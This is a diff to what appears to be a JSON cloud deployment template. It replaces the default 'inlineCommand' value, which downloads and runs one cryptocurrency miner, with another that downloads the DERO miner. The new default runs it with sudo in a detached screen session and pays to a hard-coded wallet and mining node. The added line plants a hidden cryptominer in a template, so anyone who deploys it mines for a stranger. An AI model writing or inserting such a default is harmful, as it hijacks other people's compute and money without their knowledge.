@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.9/SRBMiner-Multi-1-0-9-Linux.tar.xz; tar xf SRBMiner-Multi-1-0-9-Linux.tar.xz; cd SRBMiner-Multi-1-0-9; sudo screen -d -m ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RB1PxW1x79NfNtjqbvQ5ZPVJj8Bkk9x6PJ.Ronaldo --password x",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/deroproject/derohe/releases/download/Release113/dero_linux_amd64.tar.gz; tar xf dero_linux_amd64.tar.gz; cd dero_linux_amd64; sudo screen -d -m ./dero-miner-linux-amd64 --wallet-address dero1qyyfg34v967gktykjd3xgwnaaqtd6hcwsppmy40kcvssh6vuj3mquqqwlelav --daemon-rpc-address=minernode1.dero.live:10100",
             "metadata": {
                 "description": "inline command"
             }
